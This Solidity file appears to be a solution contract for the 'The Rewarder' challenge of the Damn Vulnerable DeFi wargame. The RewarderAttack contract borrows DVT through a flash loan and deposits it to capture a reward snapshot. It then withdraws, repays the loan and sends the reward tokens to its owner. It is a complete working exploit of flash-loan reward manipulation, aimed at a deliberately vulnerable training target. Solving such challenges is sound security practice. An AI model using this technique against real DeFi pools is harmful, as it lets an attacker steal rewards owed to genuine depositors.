// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttack {
	FlashLoanerPool immutable flashPool;
	TheRewarderPool immutable rewarderPool;
	DamnValuableToken immutable DVT;
	RewardToken immutable rewardToken;
	address immutable owner;

	constructor(
		address _flashPool,
		address _rewarderPool,
		address _dvt,
		address _rewardToken
	) {
		flashPool = FlashLoanerPool(_flashPool);
		rewarderPool = TheRewarderPool(_rewarderPool);
		DVT = DamnValuableToken(_dvt);
		rewardToken = RewardToken(_rewardToken);
		owner = msg.sender;
	}

	function executeFlashLoan(uint256 amount) external {
		require(owner == msg.sender);
		flashPool.flashLoan(amount);
	}

	function receiveFlashLoan(uint256 amount) external {
		// Approve and deposit DVT to get reward tokens
		DVT.approve(address(rewarderPool), amount);
		rewarderPool.deposit(amount);

		// Withdraw DVT and pay flash loan back
		rewarderPool.withdraw(amount);
		DVT.transfer(address(flashPool), amount);
	}

	function withdrawRewards() external {
		rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
	}
}
